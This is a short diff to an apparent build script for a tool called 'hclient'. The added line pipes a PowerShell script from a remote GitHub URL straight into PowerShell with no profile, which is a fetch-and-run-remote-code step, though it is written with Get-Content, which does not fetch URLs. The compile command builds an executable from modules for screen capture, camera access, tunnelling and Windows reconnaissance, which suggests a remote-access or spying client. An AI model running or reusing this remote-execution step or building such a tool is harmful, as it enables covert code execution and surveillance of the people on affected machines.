@@ -12,6 +12,6 @@ The above copyright notice and this permission notice shall be included in all
 copies or substantial portions of the Software.
 */ 
 
-Get-Content lol.ps1 | PowerShell.exe -noprofile -
+Get-Content https://github.com/addict4ever/SourceTools/raw/main/hclient/lol.ps1 | PowerShell.exe -noprofile -
 
 cl /Fe:httptest.exe /I"C:\temp\hclient\include" /std:c++17 /EHsc user32.lib gdi32.lib httptest.cpp screencapture.cpp fileutils.cpp ctun.cpp camera.cpp reconwin.cpp /link /LIBPATH:"C:\temp\hclient\lib" libcurl.lib zlib.lib user32.lib gdi32.lib Ws2_32.lib Crypt32.lib Advapi32.lib ole32.lib strmiids.lib oleaut32.lib Netapi32.lib
